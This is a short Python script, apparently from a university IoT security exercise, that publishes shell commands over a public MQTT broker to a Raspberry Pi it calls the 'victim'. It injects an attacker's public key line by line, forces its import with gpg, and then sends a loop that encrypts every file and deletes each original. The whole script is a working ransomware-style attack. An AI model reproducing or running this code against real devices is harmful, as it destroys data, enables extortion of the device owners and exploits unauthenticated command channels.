from MyMQTT import *
from time import sleep
import paho.mqtt.client as PahoMQTT
import sys

class pubOnly():

    def __init__(self, clientID):
        self.client = MyMQTT(clientID, "test.mosquitto.org", 1883, self)
        self.clientID = clientID
        print(f"{self.clientID} created")
        self.client.start()
        self.client.mySubscribe("PoliTo/C4ES/#")

        topic = "PoliTo/C4ES/" + clientname + "/command"

        message1 = {"src" : clientname, "dest" : "pi1", "command" : "ls -la"}

        sleep(2)

        filepointer = open("malware_public.key")

        primo = 1

        print("Injecting public key to victim's file system...")

        for row in filepointer:
            row = row.strip('\n')
            if(primo == 1):
                primo = 0
                message = {"src" : clientname, "dest" : "pi1", "command" : f"echo {row} > public.key"}
                self.client.myPublish(topic, message)
            else:
                message = {"src" : clientname, "dest" : "pi1", "command" : f"echo {row} >> public.key"}
                self.client.myPublish(topic, message)
            sleep(0.5)

        print("... operation completed successfully.")

        sleep(5)

        print("Forcing victim to import the public key...")

        message = {"src" : clientname, "dest" : "pi1", "command" : "gpg --import public.key"}
        self.client.myPublish(topic, message)        

        sleep(1)

        print("... operation completed successfully.")

        sleep(5)

        print("Performing encryption on victim's file system...")

        message = {"src" : clientname, "dest" : "pi1", "command" : "for i in $(find . -type f -print); do gpg --always-trust -e -r \"malware\" $i; rm -f $i; sleep 1; done"}
        self.client.myPublish(topic, message) 

        print("... encryption command sent. Now victim will operate by itself.")

        sleep(5)


        
    def notify(self, message, topic):
        if topic == f"PoliTo/C4ES/{self.clientID}/command":
            print("loopback")
            return



if __name__ == "__main__":

    clientname = str(sys.argv[1])

    publisher = pubOnly(clientname)
